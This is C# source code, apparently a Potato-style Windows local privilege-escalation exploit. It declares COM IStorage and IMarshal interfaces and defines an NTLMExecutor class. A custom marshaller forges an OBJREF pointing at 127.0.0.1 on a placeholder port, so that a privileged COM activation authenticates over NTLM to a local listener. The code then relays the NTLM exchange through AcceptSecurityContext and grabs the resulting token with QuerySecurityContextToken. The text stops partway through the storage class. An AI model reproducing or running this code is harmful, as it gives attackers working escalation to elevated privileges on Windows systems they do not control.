using System;
using System.Text;
using System.IO;
using System.Collections.Concurrent;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;

using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

using System.Runtime.ConstrainedExecution;
using System.Security;

    public enum CLSCTX
    {
	CLSCTX_INPROC_SERVER = 1,
	CLSCTX_INPROC_HANDLER,
	CLSCTX_LOCAL_SERVER = 4,
	CLSCTX_INPROC_SERVER16 = 8,
	CLSCTX_REMOTE_SERVER = 16,
	CLSCTX_INPROC_HANDLER16 = 32,
	CLSCTX_RESERVED1 = 64,
	CLSCTX_RESERVED2 = 128,
	CLSCTX_RESERVED3 = 256,
	CLSCTX_RESERVED4 = 512,
	CLSCTX_NO_CODE_DOWNLOAD = 1024,
	CLSCTX_RESERVED5 = 2048,
	CLSCTX_NO_CUSTOM_MARSHAL = 4096,
	CLSCTX_ENABLE_CODE_DOWNLOAD = 8192,
	CLSCTX_NO_FAILURE_LOG = 16384,
	CLSCTX_DISABLE_AAA = 32768,
	CLSCTX_ENABLE_AAA = 65536,
	CLSCTX_FROM_DEFAULT_CONTEXT = 131072
    }
    [StructLayout(LayoutKind.Sequential, Pack = 8)]
    public struct ImmLARGE_INTEGER
    {
	public long QuadPart;
    }
    
    public struct ImmULARGE_INTEGER
    {
	public ulong QuadPart;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct ImmFILETIME
    {
	public uint dwLowDateTime;
	public uint dwHighDateTime;
    }
    
    [Guid("0000000D-0000-0000-C000-000000000046")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmIEnumSTATSTG
    {
	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Next( [In] uint celt, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] [Out] ImmSTATSTG[] rgelt,  out uint pceltFetched);

	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Skip( [In] uint celt);

	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Reset();

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Clone([MarshalAs(UnmanagedType.Interface)] out ImmIEnumSTATSTG ppEnum);
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 8)]
    public struct ImmSTATSTG
    {
	[MarshalAs(UnmanagedType.LPWStr)]
	public string pwcsName;

	public uint type;

	public ImmULARGE_INTEGER cbSize;

	public ImmFILETIME mtime;

	public ImmFILETIME ctime;

	public ImmFILETIME atime;

	public uint grfMode;

	public uint grfLocksSupported;

	public Guid clsid;

	public uint grfStateBits;

	public uint reserved;
    }
    [Guid("0C733A30-2A1C-11CE-ADE5-00AA0044773D")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmISequentialStream
    {
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Read([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [Out] byte[] pv, [In] uint cb,  out uint pcbRead);
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Write([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [In] byte[] pv, [In] uint cb,  out uint pcbWritten);
    }
    
    [Guid("0000000C-0000-0000-C000-000000000046")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmIStream : ImmISequentialStream
    {
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Read([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [Out] byte[] pv, [In] uint cb, out uint pcbRead);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Write([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [In] byte[] pv, [In] uint cb,  out uint pcbWritten);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Seek( [In] ImmLARGE_INTEGER dlibMove,  [In] uint dwOrigin,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] plibNewPosition);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void SetSize([In] ImmULARGE_INTEGER libNewSize);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void CopyTo([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm,  [In] ImmULARGE_INTEGER cb,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbRead,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbWritten);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Commit( [In] uint grfCommitFlags);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Revert();

	[MethodImpl(MethodImplOptions.InternalCall)]
	void LockRegion( [In] ImmULARGE_INTEGER libOffset,  [In] ImmULARGE_INTEGER cb, [In] uint dwLockType);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void UnlockRegion( [In] ImmULARGE_INTEGER libOffset, [In] ImmULARGE_INTEGER cb, [In] uint dwLockType);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Stat( [MarshalAs(UnmanagedType.LPArray)] [Out] ImmSTATSTG[] pstatstg, [In] uint grfStatFlag);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Clone([MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);
    }
    [Guid("00000003-0000-0000-C000-000000000046")]
	[InterfaceType(1)]
	[ComConversionLoss]
	[ComImport]
	public interface ImmIMarshal
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetUnmarshalClass( [In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out Guid pCid);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetMarshalSizeMax([In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out uint pSize);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void MarshalInterface([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void UnmarshalInterface([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] ref Guid riid, out IntPtr ppv);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void ReleaseMarshalData([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void DisconnectObject([In] uint dwReserved);
	}
	[InterfaceType(1)]
	[ComConversionLoss]
	[Guid("0000000B-0000-0000-C000-000000000046")]
	[ComImport]
	public interface ImmIStorage
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		void CreateStream([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] uint grfMode,  [In] uint reserved1, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void OpenStream([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] IntPtr reserved1, [In] uint grfMode, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void CreateStorage([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] uint grfMode,  [In] uint reserved1, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStorage ppstg);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void OpenStorage([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgPriority, [In] uint grfMode, [In] IntPtr snbExclude, [In] uint reserved, [MarshalAs(UnmanagedType.Interface)] out ImmIStorage ppstg);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void CopyTo([In] uint ciidExclude, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] [In] Guid[] rgiidExclude, [In] IntPtr snbExclude, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgDest);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void MoveElementTo([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgDest, [MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsNewName, [In] uint grfFlags);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Commit([In] uint grfCommitFlags);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Revert();

		[MethodImpl(MethodImplOptions.InternalCall)]
		void EnumElements( [In] uint reserved1, [In] IntPtr reserved2, [In] uint reserved3, [MarshalAs(UnmanagedType.Interface)] out ImmIEnumSTATSTG ppEnum);
		[MethodImpl(MethodImplOptions.InternalCall)]
		void DestroyElement([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void RenameElement([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsOldName, [MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsNewName);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetElementTimes([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName,  [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] pctime, [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] patime, [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] pmtime);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetClass([In] ref Guid clsid);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetStateBits([In] uint grfStateBits, [In] uint grfMask);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Stat( [MarshalAs(UnmanagedType.LPArray)] [Out] ImmSTATSTG[] pstatstg, [In] uint grfStatFlag);
	}


    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_HANDLE
    {
	public IntPtr LowPart;
	public IntPtr HighPart;
	public SECURITY_HANDLE(int dummy)
	{
	    LowPart = HighPart = IntPtr.Zero;
	}
    };
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_INTEGER
    {
	public uint LowPart;
	public int HighPart;
	public SECURITY_INTEGER(int dummy)
	{
	    LowPart = 0;
	    HighPart = 0;
	}
    };



    public enum StgmConstants { 
	READ = 0x00000000,
	WRITE = 0x00000001,
	READWRITE = 0x00000002,
	// Sharing
	SHARE_EXCLUSIVE = 0x00000010,
	SHARE_DENY_WRITE = 0x00000020,
	SHARE_DENY_READ = 0x00000030,
	SHARE_DENY_NONE = 0x00000040,
	PRIORITY = 0x00040000,

	// Creation
	FAILIFTHERE = 0x00000000,
	CREATE = 0x00001000,
	CONVERT = 0x00020000,

	// Transactioning
	DIRECT = 0x00000000,
	TRANSACTED = 0x00010000,

	// Transactioning Performance
	NOSCRATCH = 0x00100000,
	NOSNAPSHOT = 0x00200000,

	// Direct SWMR and Simple
	SIMPLE = 0x08000000,
	DIRECT_SWMR = 0x00400000,

	// Delete on release
	DELETEONRELEASE = 0x04000000,
    };

    public enum Secur32 {
	// Native data representation
	SECURITY_NATIVE_DREP = 0x10,
	ASC_REQ_ALLOCATE_MEMORY = 0x100,
	ASC_REQ_CONNECTION = 0x800,
	SECBUFFER_TOKEN = 2,
	SECPKG_CRED_INBOUND = 1,
	SECBUFFER_VERSION=0,
    };



    // NN: https://www.pinvoke.net/default.aspx/Enums/HRESULT.html
    enum HRESULT : long{
	S_FALSE = 0x0001,
	S_OK = 0x0000,
	E_INVALIDARG = 0x80070057,
	E_OUTOFMEMORY = 0x8007000E
    }
	

    // NN: https://docs.microsoft.com/en-us/dotnet/framework/interop/marshaling-classes-structures-and-unions
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
	public int Version;
        public int BufferCount;
	// NN: these MarshalAs directives don't work
	// [MarshalAs(UnmanagedType.LPStruct)]
	// [MarshalAs(UnmanagedType.AsAny)]
        // public SecBuffer BuffersPtr;
	
	// NN: https://docs.microsoft.com/en-us/dotnet/framework/interop/marshaling-classes-structures-and-unions
	public IntPtr BuffersPtr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer
    {
        public int BufferSize;
        public int BufferType;
	// NN: yeah that doesn't work
	// [MarshalAs(UnmanagedType.LPArray)]
        // public byte[] BufferPtr;
	public IntPtr BufferPtr;
    }

    public class NTLMExecutor{
	[DllImport ("secur32.dll", SetLastError=true)]
	public extern static int QuerySecurityContextToken(
							   //ref SECURITY_HANDLE phContext,
							   IntPtr phContext,
							   IntPtr p_handle);

	[DllImport("secur32.dll", SetLastError=true)]
	public static extern int AcquireCredentialsHandle(
							  string pszPrincipal,
							  string pszPackage, 
							  int fCredentialUse,
							  IntPtr PAuthenticationID,
							  IntPtr pAuthData,
							  int pGetKeyFn, 
							  IntPtr pvGetKeyArgument,
							  // out SECURITY_HANDLE phCredential,
							  IntPtr phCredential,
							  out SECURITY_INTEGER ptsExpiry);

	[DllImport("secur32.dll", SetLastError=true)]
static extern int AcceptSecurityContext(
                    IntPtr phCredential,
                    IntPtr phContext,
                    ref SecBufferDesc pInput,
                    uint fContextReq,
                    uint TargetDataRep,
		    IntPtr phNewContext,
                    out SecBufferDesc pOutput,
                    out uint pfContextAttr,
                    out SECURITY_INTEGER ptsTimeStamp);


	public void InitClientBuffer(ref SecBuffer buffer, ref SecBufferDesc buffer_desc){
	    buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    buffer_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    buffer_desc.BufferCount = 1;
	    buffer_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(buffer));
	    Marshal.StructureToPtr(buffer, buffer_desc.BuffersPtr, false);
	}
	
	public void InitServerBuffer(ref SecBuffer buffer, ref SecBufferDesc buffer_desc){
	    buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    buffer.BufferSize = 0;
	    buffer.BufferPtr = IntPtr.Zero;

	    buffer_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    buffer_desc.BufferCount = 1;
	    buffer_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(buffer));
	    Marshal.StructureToPtr(buffer, buffer_desc.BuffersPtr, false);
	}
	
	public int FindNTLMHeader(byte[] buffer){
	    // Bytes: NTLMSSP
	    byte[] ntlm_sig = new byte[]{0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
	    int sig_idx = 0;
	    int idx = 0;

	    Console.WriteLine("[FindNTLMHeader] buffer.Length:" + buffer.Length);
	    foreach (byte current in buffer){
		if (ntlm_sig[sig_idx] == current){
		    sig_idx ++;
		} else {
		    sig_idx = 0;
		}
		
		if (sig_idx >= ntlm_sig.Length){
		    return idx - 6;
		}
		idx++;
	    }
	    if (sig_idx >= ntlm_sig.Length)
		return sig_idx - 6;
	    return -1;
	}

	public SecBuffer client_buffer;
	public SecBufferDesc client_desc;
	    
	public SecBuffer server_buffer;
	public SecBufferDesc server_desc;

	public SECURITY_HANDLE cred_handle;
	public IntPtr p_cred_handle;

	public SECURITY_HANDLE ctxt_handle;

	public IntPtr p_ctxt_handle;
	public IntPtr p_elevated_handle;

	public NTLMExecutor(){
	    client_buffer = new SecBuffer();
	    client_desc = new SecBufferDesc();
	    
	    server_buffer = new SecBuffer();
	    server_desc = new SecBufferDesc();
	    
	    cred_handle = new SECURITY_HANDLE(0);
	    ctxt_handle = new SECURITY_HANDLE(0);
	    p_cred_handle = Marshal.AllocHGlobal(Marshal.SizeOf(cred_handle));
	    Marshal.StructureToPtr(cred_handle, p_cred_handle, false);
	    p_ctxt_handle = Marshal.AllocHGlobal(Marshal.SizeOf(ctxt_handle));
	    Marshal.StructureToPtr(ctxt_handle, p_ctxt_handle, false);

	    p_elevated_handle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
	}

	public void dispatch_ntlm(byte[] buffer){
	    byte[] return_value = buffer;
	    int ntlm_offset = this.FindNTLMHeader(buffer);
	    Console.WriteLine("[dispatch_ntlm] NTLMSSP offset: " + ntlm_offset);
	    if (ntlm_offset >= 0){
		byte ntlm_type = buffer[ntlm_offset+8];

		Console.WriteLine(String.Format("[dispatch_ntlm] ntlm type:{0}", ntlm_type));
		if (ntlm_type == (byte)1){
		    Console.WriteLine("[dispatch_ntlm] hit type 1...");
		    this.Type1(buffer, ntlm_offset);
		}
		else if (ntlm_type == (byte)2){
		    Console.WriteLine("[dispatch_ntlm] hit type 2...");
		    this.Type2(buffer, ntlm_offset);
		}
		else if (ntlm_type == (byte)3){
		    Console.WriteLine("[dispatch_ntlm] hit type 3...");
		    this.Type3(buffer, ntlm_offset);
		}
	    }
	}

	public bool Type1(byte[] input, int ntlm_offset){
	    int ntlm_length = (input.Length - ntlm_offset);
	    Console.WriteLine("[Type1] handling response...");
	    Console.WriteLine("[Type1] ntlm_length:" + ntlm_length);
	    SECURITY_INTEGER expiration_acq = new SECURITY_INTEGER(0);
	    SECURITY_INTEGER expiration_acc = new SECURITY_INTEGER(0);
	    

	    int status = AcquireCredentialsHandle(
						  null,
						  "Negotiate",
						  (int)Secur32.SECPKG_CRED_INBOUND,
						  IntPtr.Zero,
						  IntPtr.Zero,
						  0,
						  IntPtr.Zero,
						  // out cred_handle,
						  p_cred_handle,
						  out expiration_acq);
	    if ( status != (int)HRESULT.S_OK){
		Console.WriteLine("!! AcquireCredentialsHandle failed");
		return false;
	    }


	    SECURITY_HANDLE sec_handle = new SECURITY_HANDLE();
	    
	    // Client buffers
	    client_buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    client_buffer.BufferPtr = Marshal.AllocHGlobal(ntlm_length);
	    client_buffer.BufferSize = ntlm_length;
	    Marshal.Copy(input, ntlm_offset, client_buffer.BufferPtr, ntlm_length);

	    client_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    client_desc.BufferCount = 1;
	    client_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(client_buffer));
	    Marshal.StructureToPtr(client_buffer, client_desc.BuffersPtr, false);

	    // Server buffers
	    server_buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    server_buffer.BufferSize = 0;
	    server_buffer.BufferPtr = IntPtr.Zero;

	    server_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    server_desc.BufferCount = 1;
	    server_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(server_buffer));
	    Marshal.StructureToPtr(server_buffer, server_desc.BuffersPtr, false);
	    
	    
	    Console.WriteLine(String.Format("[Type1] client_buffer.BufferPtr: {0:x8}", client_buffer.BufferPtr));
	    Console.WriteLine(String.Format("[Type1] server_buffer.BufferPtr: {0:x8}", server_buffer.BufferPtr));

	    uint context_attr;

	    status = AcceptSecurityContext(
					   p_cred_handle,
					   IntPtr.Zero,
					   ref client_desc,
					   (uint)(Secur32.ASC_REQ_ALLOCATE_MEMORY | Secur32.ASC_REQ_CONNECTION),
					   (uint)Secur32.SECURITY_NATIVE_DREP,
					   // out ctxt_handle,
					   p_ctxt_handle,
					   out server_desc,
					   out context_attr,
					   out expiration_acc);

	    Console.WriteLine(String.Format("[Type1] AcceptSecurityContext returned {0:x8}", status));

	    server_buffer = (SecBuffer)Marshal.PtrToStructure(server_desc.BuffersPtr, typeof(SecBuffer));

	    Console.WriteLine(String.Format("[Type1] new server security buffer: {0:x8}", server_buffer.BufferPtr));

	    if (status == (int)HRESULT.S_OK){
		return true;
	    }
	    
	    return false;
	}

	public void PrintByteArray(byte[] bytes){
	    var sb = new StringBuilder(String.Format("new byte[{0}] {{ ", bytes.Length));
	    foreach (var b in bytes)
	    {
		sb.Append(b + ", ");
	    }
	    sb.Append("}");
	    Console.WriteLine(sb.ToString());
	}

	public bool Type2(byte[] input, int ntlm_offset){
	    int ntlm_length = input.Length - ntlm_offset;
	    Console.WriteLine("[Type2] handling response...");
	    Console.WriteLine("[Type2] ntlm_length:" + ntlm_length);
	    Console.WriteLine("[Type2] server_buffer.BufferSize:" + server_buffer.BufferSize);
	    if ((server_buffer.BufferSize <= ntlm_length) && (server_buffer.BufferSize != 0)){
		byte[] buffer = new byte[server_buffer.BufferSize];
		Marshal.Copy(server_buffer.BufferPtr, buffer, 0, server_buffer.BufferSize);

		this.PrintByteArray(buffer);
		
		for (int i = 0; i < ntlm_length; i++){
		    if (i >= server_buffer.BufferSize){
			input[i+ntlm_offset] = (byte)0;
		    } else {
			input[i+ntlm_offset] = buffer[i];
		    }
		}
	    }
	    else {
		Console.WriteLine("[Type2] ERROR! CANNOT REPLACE CREDENTIALS IN BUFFER!");
		return false;
	    }

	    return true;
	}

	public bool check_cred_handle(){
	    int status = QuerySecurityContextToken(p_ctxt_handle, p_elevated_handle);
	    
	    Console.WriteLine(String.Format("[check_cred_handle] got status {0} from QuerySecurityContextToken", status));
	    
	    return (status == (int)HRESULT.S_OK);
	}

	public bool Type3(byte[] input, int ntlm_offset){
	    int ntlm_length = input.Length - ntlm_offset;
	    
	    Console.WriteLine("[Type3] handling type 3 resposne");

	    // Client buffers
	    client_buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    client_buffer.BufferPtr = Marshal.AllocHGlobal(ntlm_length);
	    client_buffer.BufferSize = ntlm_length;
	    Marshal.Copy(input, ntlm_offset, client_buffer.BufferPtr, ntlm_length);

	    client_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    client_desc.BufferCount = 1;
	    client_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(client_buffer));
	    Marshal.StructureToPtr(client_buffer, client_desc.BuffersPtr, false);

	    // Server buffers
	    server_buffer.BufferType = (int)Secur32.SECBUFFER_TOKEN;
	    server_buffer.BufferSize = 0;
	    server_buffer.BufferPtr = IntPtr.Zero;

	    server_desc.Version = (int)Secur32.SECBUFFER_VERSION;
	    server_desc.BufferCount = 1;
	    server_desc.BuffersPtr = Marshal.AllocHGlobal(Marshal.SizeOf(server_buffer));
	    Marshal.StructureToPtr(server_buffer, server_desc.BuffersPtr, false);

	    
	    SECURITY_INTEGER context_expiration = new SECURITY_INTEGER(0);
	    uint context_attr;
	    int status = 0;


	    status = AcceptSecurityContext(
					   p_cred_handle,
					   p_ctxt_handle,
					   ref client_desc,
					   (uint)(Secur32.ASC_REQ_ALLOCATE_MEMORY | Secur32.ASC_REQ_CONNECTION),
					   (uint)Secur32.SECURITY_NATIVE_DREP,
					   // out ctxt_handle,
					   p_ctxt_handle,
					   out server_desc,
					   out context_attr,
					   out context_expiration);


	    Console.WriteLine(String.Format("[Type3] AcceptSecurityContext returned:{0:x8}", status));

	    this.check_cred_handle();

	    return true;
	}
	
    }
    
    
    
    [System.Runtime.InteropServices.ComConversionLoss]
    [System.Runtime.InteropServices.Guid("0000000B-0000-0000-C000-000000000046")]
    // [System.Runtime.InteropServices.InterfaceType(1)]
    public class ImmComStorage : ImmIStorage, ImmIMarshal{
	public ImmIStorage storage;
	
	public ImmComStorage(ImmIStorage arg_storage){
	    storage = arg_storage;
	}

	[StructLayout(LayoutKind.Sequential)]
        public struct MULTI_QI
        {
            public IntPtr pIID;
            [MarshalAs(UnmanagedType.Interface)]
            public object pItf;
            public int hr;
        }

	
	[MethodImpl(MethodImplOptions.NoInlining)]
	public string GetCurrentMethod (){
	    StackTrace st = new StackTrace ();
	    StackFrame sf = st.GetFrame (1);
	    return sf.GetMethod().Name;
	}

	[StructLayout(LayoutKind.Sequential)]
        public class COSERVERINFO
        {
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public uint dwReserved2;
        }



	[DllImport("ole32.dll", CharSet=CharSet.Unicode, ExactSpelling=true, PreserveSig=false)]
	public static extern Guid CLSIDFromString(string lpsz);

	[DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        public static extern void CoGetInstanceFromIStorage(
							    IntPtr pServerInfo,
							    ref Guid pclsid,
							    [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
							    CLSCTX dwClsCtx,
							    ImmIStorage pstg,
							    uint cmq,
							    [In, Out] MULTI_QI[] rgmqResults);

	// IMarshal
	public void DisconnectObject (uint dwReserved){}
	public void GetMarshalSizeMax (ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    pSize = 1024;
	}
	public void GetUnmarshalClass (ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    pCid = new Guid("00000306-0000-0000-c000-000000000046");
	}
	public void MarshalInterface (ImmIStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    byte[] interface_bytes;
	    
	    MemoryStream stream = new MemoryStream();
	    BinaryWriter writer = new BinaryWriter(stream);
	    Guid iid_iunknown = new Guid("00000000-0000-0000-C000-000000000046");
	    // MEOW magic number
	    writer.Write(new byte[]{ 0x4D, 0x45, 0x4F, 0x57});
	    
	    // OBJREF_STANDARD
	    writer.Write(0x00000001);
	    
	    // IUnknown GUID
	    writer.Write(iid_iunknown.ToByteArray()); 
	    
	    // OBJREF_STANDARD
	    writer.Write(0); // Flags
	    writer.Write(1); // cPublicRefs
	    Random id_generator = new Random();
	    
	    byte[] oxid_bytes = new byte[8];
	    byte[] oid_bytes = new byte[8];
	    byte[] ipid_bytes = new byte[16];
	    
	    id_generator.NextBytes(oxid_bytes);
	    id_generator.NextBytes(oid_bytes);
	    id_generator.NextBytes(ipid_bytes);

	    writer.Write(oxid_bytes);
	    writer.Write(oid_bytes);
	    writer.Write(ipid_bytes);

	    // DualStringArray structure
	    // Binding strings
	    MemoryStream bs_stream = new MemoryStream();
	    BinaryWriter bs_writer = new BinaryWriter(bs_stream);
	    byte[] bs;

	    ushort tower_id = 7; // TCP

	    bs_writer.Write(tower_id);
	    bs_writer.Write(Encoding.Unicode.GetBytes("127.0.0.1[SERVER_PORT]\0"));
	    bs_writer.Write((ushort) 0);
	    bs = bs_stream.ToArray();

	    // Security bindings
	    MemoryStream sb_stream = new MemoryStream();
	    BinaryWriter sb_writer = new BinaryWriter(sb_stream);
	    byte[] sb;

	    // RPC_C_AUTHN_WINNT
	    sb_writer.Write((ushort)0x0a);
	    sb_writer.Write((ushort)0xffff);
	    sb_writer.Write((ushort) 0);
	    sb_writer.Write((ushort) 0);
	    sb = sb_stream.ToArray();

	    // Write total length of DualStringArray
	    // Total length of DSA
	    writer.Write((ushort)((bs.Length + sb.Length)/ sizeof(ushort)));
	    // Offset to security 
	    writer.Write((ushort)(bs.Length/sizeof(ushort)));
	    // Write string bindings
	    writer.Write(bs);
	    // Write security bindings
	    writer.Write(sb);

	    writer.Close();
	    interface_bytes = stream.ToArray();
	    stream.Close();

	    uint count_written = 0;
	    pstm.Write(interface_bytes, (uint)interface_bytes.Length, out count_written);

	}
	public void ReleaseMarshalData (ImmIStream pstm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void UnmarshalInterface (ImmIStream pstm, ref Guid riid, out IntPtr ppv){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    ppv = IntPtr.Zero;
	}

	// IStorage
	public void Commit (uint grfCommitFlags){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.Commit(grfCommitFlags);
	}
	public void CopyTo (uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, ImmIStorage pstgDest){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
	}
	public void CreateStorage (string pwcsName, uint grfMode, uint reserved1, uint reserved2, out ImmIStorage ppstg){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
	}
	public void CreateStream (string pwcsName, uint grfMode, uint reserved1, uint reserved2, out ImmIStream ppstm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
	}
	public void DestroyElement (string pwcsName){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.DestroyElement(pwcsName);
	}
	public void EnumElements (uint reserved1, IntPtr reserved2, uint reserved3, out ImmIEnumSTATSTG ppEnum){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
	}
	public void MoveElementTo (string pwcsName, ImmIStorage pstgDest, string pwcsNewName, uint grfFlags){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
	}
	public void OpenStorage (string pwcsName, ImmIStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out ImmIStorage ppstg){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
	}
	public void OpenStream (string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out ImmIStream ppstm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
	}
	public void RenameElement (string pwcsOldName, string pwcsNewName){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void Revert (){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void SetClass (ref Guid clsid){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
